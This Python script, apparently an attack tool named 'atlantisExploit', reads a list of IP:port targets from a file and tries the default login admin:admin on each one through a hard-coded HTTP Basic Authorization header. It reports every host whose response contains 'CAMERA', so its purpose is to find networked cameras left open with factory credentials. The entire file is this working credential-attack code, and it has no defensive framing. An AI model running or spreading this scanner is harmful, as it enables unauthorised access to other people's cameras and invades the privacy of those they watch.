import os , sys , urllib.error , re , http
import urllib.request
import http.client
class atlantisExploit:
    def atlantisBruteforce(self):
        hdr = {'Authorization': 'Basic YWRtaW46YWRtaW='}
        pathOs = os.path.abspath(os.path.dirname(sys.argv[0]))
        # vulnerable_host = open(pathOs + '/Host/up_host.txt', 'r').read().splitlines()
        vulnerable_host = open(pathOs + '/Host/up_host.txt', 'r').read().splitlines()
        pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        pattern_2 = r'(\:).*'
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                match1 = re.search(pattern_1, res)
                match2 = re.search(pattern_2, res)
                host = match1.group()
                port_raw = match2.group()
                port = port_raw[1:]
                url = "http://"+host + ":"+ port+"/"
                hdr = {'Authorization': 'Basic YWRtaW46YWRtaW4='}
                req = urllib.request.Request(url, headers=hdr)
                response = urllib.request.urlopen(req)
                r = response.read()
                if b"CAMERA" in r:
                    print("[-]Found " +url+ " with admin:admin")
            except urllib.error.HTTPError:
                pass
            except urllib.error.URLError:
                pass
            except http.client.RemoteDisconnected:
                pass
            except http.client.BadStatusLine:
                pass
            a +=1
